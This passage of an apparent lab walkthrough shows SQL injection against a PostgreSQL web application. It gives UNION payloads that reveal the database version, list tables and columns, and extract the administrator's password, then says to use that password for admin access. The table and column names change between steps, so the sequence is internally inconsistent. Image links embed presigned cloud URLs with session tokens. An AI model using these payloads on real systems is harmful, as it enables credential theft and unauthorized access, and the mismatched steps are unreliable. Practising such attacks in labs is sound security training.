# Listing the database contents on non-Oracle databases.

**both column 1 and 2 contain data type string.**

**STEP #3**

Query the database to retrieve database type.

```text
' UNION SELECT version(), NULL--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/e18d5687-f060-464c-b24e-b96b3edd6468/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XO5OFA7X%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221802Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD7loVpQmoiYVkXorYV%2F087tEaLdUBu4Tv3Khx1LmP6kAIgLtVNr1nCZQlZxPuPp8Ct7UIhAy4hJzJ6pvsa%2F4orncMqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDOHteW87yg9ZsS9koCrcA8X2t2wPXKSUKjuHv96UOpiAO8C8dCp2y1%2BveUiWVdRPAL3ZhkCozLy9vSIFqHYIvOUyTMFeJvL2sEF3x93yURY3mcrg9hWYgs9W9pj%2FMQWKqhDd%2F6nlugck1yTmUZnj4KGtiWrHi8Wbfakx36QfjYK3uRRFZruQvtA8j5nx7a0bCuAtjZk9DvIfwMGSPAQ6o1tZiz0LCQcyIKFHOZ3Wnnmce3je6D%2FE1roJ%2BiJIEVRfijcI5wgHDV%2BiqOeXirBv%2FGbperLYHeEdNOTllDAEom8QEN%2Baj8xLL5e2CYChho%2BCbJOIb4xhvjZGMeaMPbFD3BoTuaZaaaq8d8h7cMpghNj6mK54WL7vYoW4a0828xe2eAI2vn3sD%2BHBolE7GwBb%2BTm%2Fxxr08CJaZhiAAjBqn%2B75ZTCQsfIFlsS5h3L3Xpj3%2FGcXFdCilGvwwKRH7thBCtlA4UPfrzDn71aZQFyNYoIAsUNlReblBStYQIGCIIdXOCqoXXbpC4vqoaDoYJwjcLD0UXrG762WTEd9%2FqNs%2B%2BquwnYQScN2%2BkW9aHDSUpkTJBg9%2F4XySdKx4rgE1EOizDImiSdL1lCbK62DE8XVf1tmrTfjmo57NS3IhzrYLauBmTWELpgEk4gkICQZMMGDo9QGOqUBLI3MUdDOmOaYVWlki4UGKu%2FIfJwYa7NhsTtiESlqYo9dpa84770puSUuWNiKnzTEDIv3Iqj2FjRWZrA7ps4%2FFEBq44WDi8Rqw2bC3qs5JXWe4at4rMQ49KF%2FU3579ocBn80xQgljuy8IUBNt8K4vlTVx8irB9pDEWixU8qUi%2BqqHOIpmAZxijOnwL3wT7nMiQAyc%2FNuIaUO8cUvQV3t0bhdtakls&X-Amz-Signature=61468fc4269ad6f0769ce37aa25c0def3c05e7e8f8edde8568db6681fb6776cc&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**It returns:**

```text
PostgreSQL 11.12 (Debian 11.12–1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0–18+deb9u1) 6.3.0 20170516, 64-bit
```

**Database type: PostgreSQL**

**STEP #4**

Determine the table names.

![](https://miro.medium.com/v2/resize:fit:700/0*4vUM6NT3J_FxIyFW)

```text
' UNION SELECT table_name, NULL FROM information_schema.tables
```

![](https://miro.medium.com/v2/resize:fit:700/0*5_92Rm85mDwlIX-Z)

Let’s search for a table that contains usernames and passwords.

![](https://miro.medium.com/v2/resize:fit:700/0*JfNplyrNCXGFTbAd)

There is a table named `users_wfixez`** **this might be the table we are looking for. So let’s try retrieving columns of that table.

**STEP #5**

Determine the column names of the table `users_wfixez`

```text
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_wfixez'--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/cfe0361c-45a8-48ec-a043-1c0b65e51441/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XO5OFA7X%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221802Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD7loVpQmoiYVkXorYV%2F087tEaLdUBu4Tv3Khx1LmP6kAIgLtVNr1nCZQlZxPuPp8Ct7UIhAy4hJzJ6pvsa%2F4orncMqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDOHteW87yg9ZsS9koCrcA8X2t2wPXKSUKjuHv96UOpiAO8C8dCp2y1%2BveUiWVdRPAL3ZhkCozLy9vSIFqHYIvOUyTMFeJvL2sEF3x93yURY3mcrg9hWYgs9W9pj%2FMQWKqhDd%2F6nlugck1yTmUZnj4KGtiWrHi8Wbfakx36QfjYK3uRRFZruQvtA8j5nx7a0bCuAtjZk9DvIfwMGSPAQ6o1tZiz0LCQcyIKFHOZ3Wnnmce3je6D%2FE1roJ%2BiJIEVRfijcI5wgHDV%2BiqOeXirBv%2FGbperLYHeEdNOTllDAEom8QEN%2Baj8xLL5e2CYChho%2BCbJOIb4xhvjZGMeaMPbFD3BoTuaZaaaq8d8h7cMpghNj6mK54WL7vYoW4a0828xe2eAI2vn3sD%2BHBolE7GwBb%2BTm%2Fxxr08CJaZhiAAjBqn%2B75ZTCQsfIFlsS5h3L3Xpj3%2FGcXFdCilGvwwKRH7thBCtlA4UPfrzDn71aZQFyNYoIAsUNlReblBStYQIGCIIdXOCqoXXbpC4vqoaDoYJwjcLD0UXrG762WTEd9%2FqNs%2B%2BquwnYQScN2%2BkW9aHDSUpkTJBg9%2F4XySdKx4rgE1EOizDImiSdL1lCbK62DE8XVf1tmrTfjmo57NS3IhzrYLauBmTWELpgEk4gkICQZMMGDo9QGOqUBLI3MUdDOmOaYVWlki4UGKu%2FIfJwYa7NhsTtiESlqYo9dpa84770puSUuWNiKnzTEDIv3Iqj2FjRWZrA7ps4%2FFEBq44WDi8Rqw2bC3qs5JXWe4at4rMQ49KF%2FU3579ocBn80xQgljuy8IUBNt8K4vlTVx8irB9pDEWixU8qUi%2BqqHOIpmAZxijOnwL3wT7nMiQAyc%2FNuIaUO8cUvQV3t0bhdtakls&X-Amz-Signature=803cdd1d6fbfc52627e90f41faa2e7ba3aa9e5976b270827a4384e16e4a6292c&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**There are two columns in the table **`users_hwlzhs`**.**

`username_wbdvqp`

`password_zfxnbv`

**STEP #6**

Retrieve the administrator’s password from the database.

```text
'+UNION+SELECT+password_xvbkii,username_wwmyan+FROM+users_wfixez--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/a70b723f-9acb-4142-81e1-e06c44bcadef/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466XO5OFA7X%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T221803Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD7loVpQmoiYVkXorYV%2F087tEaLdUBu4Tv3Khx1LmP6kAIgLtVNr1nCZQlZxPuPp8Ct7UIhAy4hJzJ6pvsa%2F4orncMqiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDOHteW87yg9ZsS9koCrcA8X2t2wPXKSUKjuHv96UOpiAO8C8dCp2y1%2BveUiWVdRPAL3ZhkCozLy9vSIFqHYIvOUyTMFeJvL2sEF3x93yURY3mcrg9hWYgs9W9pj%2FMQWKqhDd%2F6nlugck1yTmUZnj4KGtiWrHi8Wbfakx36QfjYK3uRRFZruQvtA8j5nx7a0bCuAtjZk9DvIfwMGSPAQ6o1tZiz0LCQcyIKFHOZ3Wnnmce3je6D%2FE1roJ%2BiJIEVRfijcI5wgHDV%2BiqOeXirBv%2FGbperLYHeEdNOTllDAEom8QEN%2Baj8xLL5e2CYChho%2BCbJOIb4xhvjZGMeaMPbFD3BoTuaZaaaq8d8h7cMpghNj6mK54WL7vYoW4a0828xe2eAI2vn3sD%2BHBolE7GwBb%2BTm%2Fxxr08CJaZhiAAjBqn%2B75ZTCQsfIFlsS5h3L3Xpj3%2FGcXFdCilGvwwKRH7thBCtlA4UPfrzDn71aZQFyNYoIAsUNlReblBStYQIGCIIdXOCqoXXbpC4vqoaDoYJwjcLD0UXrG762WTEd9%2FqNs%2B%2BquwnYQScN2%2BkW9aHDSUpkTJBg9%2F4XySdKx4rgE1EOizDImiSdL1lCbK62DE8XVf1tmrTfjmo57NS3IhzrYLauBmTWELpgEk4gkICQZMMGDo9QGOqUBLI3MUdDOmOaYVWlki4UGKu%2FIfJwYa7NhsTtiESlqYo9dpa84770puSUuWNiKnzTEDIv3Iqj2FjRWZrA7ps4%2FFEBq44WDi8Rqw2bC3qs5JXWe4at4rMQ49KF%2FU3579ocBn80xQgljuy8IUBNt8K4vlTVx8irB9pDEWixU8qUi%2BqqHOIpmAZxijOnwL3wT7nMiQAyc%2FNuIaUO8cUvQV3t0bhdtakls&X-Amz-Signature=841c73922d0b2527cecd023700637cc05fd720141e551aec3b16f7e4e337dc1b&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

|  |  |
|---|---|
| 9kn123cwvo54vzhicsns | administrator |

Use the administrator’s password to gain administrator’s access to the web application.
